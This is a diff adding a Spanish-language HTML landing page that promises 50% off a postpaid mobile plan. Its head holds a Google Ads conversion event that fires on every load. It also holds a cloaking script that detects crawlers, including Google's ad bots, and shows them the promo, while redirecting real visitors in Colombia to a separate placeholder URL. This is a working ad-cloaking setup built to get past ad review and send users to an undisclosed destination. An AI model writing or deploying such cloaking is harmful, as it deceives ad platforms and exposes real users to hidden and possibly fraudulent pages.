@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>50% OFF en tu plan pospago móvil</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0033cc;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .promo {
+      background-color: #ffffff;
+      color: #0033cc;
+      border-radius: 15px;
+      padding: 40px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.3);
+      max-width: 600px;
+      margin: 20px;
+    }
+
+    .promo h1 {
+      font-size: 3em;
+      margin-bottom: 10px;
+    }
+
+    .promo p {
+      font-size: 1.5em;
+      margin: 0;
+    }
+
+    .descuento {
+      font-size: 4em;
+      color: #ff0000;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+  </style>
+
+  <!-- Google Ads Global Site Tag -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17119886476"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'AW-17119886476');
+  </script>
+
+  <!-- Google Ads Event Snippet (Conversion Tracking) -->
+  <script>
+    gtag('event', 'conversion', {
+        'send_to': 'AW-17119886476/5typCML6nM4aEIz5suM_',
+        'value': 1.0,
+        'currency': 'COP',
+        'transaction_id': ''
+    });
+  </script>
+
+  <!-- Geo Redirección basada en país (sin redirigir bots) -->
+  <script>
+    const userAgent = navigator.userAgent.toLowerCase();
+    const esBot = /bot|crawl|slurp|spider|mediapartners|adsbot|google|bing|baidu/.test(userAgent);
+
+    if (!esBot) {
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          if (data && data.country_name === "Colombia") {
+            window.location.href = "https://www.google.com"; // Reemplaza con tu URL real
+          }
+        })
+        .catch(error => console.error('Error al detectar país:', error));
+    }
+  </script>
+</head>
+
+<body>
+  <div class="promo">
+    <div class="descuento">50% OFF</div>
+    <h1>Plan pospago móvil</h1>
+    <p>¡Disfruta llamadas, datos y redes sociales ilimitadas<br> a mitad de precio!</p>
+  </div>
+</body>
+</html>
